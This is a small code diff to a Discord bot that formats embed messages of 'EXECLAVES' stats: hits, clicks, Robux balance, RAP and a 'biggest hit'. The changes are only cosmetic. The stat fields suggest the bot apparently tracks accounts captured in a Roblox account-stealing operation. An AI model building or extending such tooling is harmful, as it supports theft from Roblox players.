@@ -110,16 +110,19 @@ client.on("messageCreate", async (message) => {
           `-- <a:emoji_6:1438247084959465534>**EXECLAVES STATS**<a:emoji_6:1438247084959465534> --\n\n` +
           `<a:emoji_3:1438164977797304410> **User:** ${userName}\n\n` +
           `<a:emoji_3:1438164977797304410> **TOTAL STATS:**\n` +
-       <a:emoji_3:1438164977797304410> **TOTAL STATS:**\n` +
-       `Hits: ${formatNumber(normal.Totals?.Accounts)}\n` +
-       `Summary: ${formatNumber(normal.Totals?.Summary)}\n` +
-       `RAP: ${formatNumber(normal.Totals?.Rap)}\n` +
-       `Clicks: ${formatNumber(normal.Totals?.Clicks)}\n\n` +
+          `Hits: ${formatNumber(normal.Totals?.Accounts)}\n` +
+          `Summary: ${formatNumber(normal.Totals?.Summary)}\n` +
+          `RAP: ${formatNumber(normal.Totals?.Rap)}\n` +
+          `Clicks: ${formatNumber(normal.Totals?.Clicks)}\n\n` +
+          
+          
           `<a:emoji_3:1438164977797304410> **BIGGEST HIT:**\n` +
           `Robux: ${formatNumber(normal.Highest?.Balance)}\n` +
           `Summary: ${formatNumber(normal.Highest?.Summary)}\n` +
           `RAP: ${formatNumber(normal.Highest?.Rap)}\n\n` +
           `──────\n\n` +
+         
+          
           `<a:emoji_3:1438164977797304410> **TOTAL HIT STATS:**\n` +
           `Summary: ${formatNumber(normal.Totals?.Summary)}\n` +
           `RAP: ${formatNumber(normal.Totals?.Rap)}\n` +
@@ -152,7 +155,7 @@ client.on("messageCreate", async (message) => {
         .setDescription(
           `-- <a:emoji_6:1438247084959465534> **EXECLAVES**<a:emoji_6:1438247084959465534>  --\n\n` +
           `<a:emoji_3:1438164977797304410> **User:** ${userName}\n\n` +
-          `<a:5228_Seta:1438177992168968343> **DAILY STATS:**\n` +
+          `<a:emoji_4:1438182484096450623> **DAILY STATS:**\n` +
           `Hits: ${formatNumber(daily.Totals?.Accounts)}\n` +
           `Summary: ${formatNumber(daily.Totals?.Summary)}\n` +
           `RAP: ${formatNumber(daily.Totals?.Rap)}\n\n` +
@@ -199,7 +202,7 @@ client.on("messageCreate", async (message) => {
 
       const embed = new EmbedBuilder()
         .setColor(0x000000)
-        .setThumbnail("https://cdn.discordapp.com/emojis/1438164171127652413.gif") // ✅ corect
+        .setThumbnail("https://cdn.discordapp.com/emojis/1438164171127652413.gif")
         .setDescription(
           `-- <a:emoji_6:1438247084959465534> **EXECLAVES** <a:emoji_6:1438247084959465534> --\n\n` +
           `<a:emoji_3:1438164977797304410> **${MAIN_SITE_NAME}**\n` +
